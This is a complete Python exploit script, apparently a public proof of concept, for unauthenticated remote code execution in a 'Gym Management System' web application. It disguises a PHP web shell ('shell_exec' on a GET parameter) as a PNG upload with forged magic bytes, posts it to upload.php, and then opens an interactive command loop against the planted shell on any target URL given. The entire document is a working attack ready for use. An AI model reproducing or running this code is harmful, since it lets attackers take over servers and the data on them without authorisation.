import argparse
import requests
import re
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# Gym Management System Unauth RCE 
class GymMSRCE:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url):
        print (LogColors.BLUE + "victim url: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.session = requests.Session()

    # get PNG magic bytes
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        r = self.session.get(self.url, verify = False, headers = self.headers)
        magic = '\x89\x50\x4e\x47\x0d\x0a\x1a'
        png = {
            'file': ('cocomelonc.php.png', 
            magic + '\n' + '<?php echo shell_exec($_GET["telepathy"]); ?>', 
            'image/png', 
            {'Content-Disposition': 'form-data'}) 
        }
        data = {"pupload" : 'upload'}

        r = self.session.post(
            self.url.rstrip("/") + '/upload.php?id=hack',
            files = png, data = data, verify = False
        )
        if r.ok:
            print (LogColors.GREEN + "successfully send payload :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to send magic payload :(" + LogColors.ENDC)

    # run shell
    def run_shell(self):
        print (LogColors.BLUE + "connect to webshell..." + LogColors.ENDC)
        url = self.url.rstrip("/") + '/upload/hack.php'
        print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
        params  = {'telepathy' : 'echo %CD%'}
        r = self.session.get(url, params = params, verify = False)
        if r.ok:
            print (LogColors.GREEN + "successful connect to webshell :)" + LogColors.ENDC)
            cwd = re.findall('[CDEF].*', r.text)
            cwd = cwd[0] + "> "
            while True:
                i = input()
                if i == "exit":
                    break
                    sys.exit()
                cmd = {'telepathy' : i}
                r = self.session.get(url, params = cmd, verify = False)
                if r.ok:
                    print (LogColors.YELLOW + r.text + LogColors.ENDC)
                else:
                    print (LogColors.YELLOW + "server resp code: " + str(r.status_code) + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed connect to webshell :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    args = vars(parser.parse_args())
    url = args['url']
    cve = GymMSRCE(url) 
    cve.exploit()
    cve.run_shell()

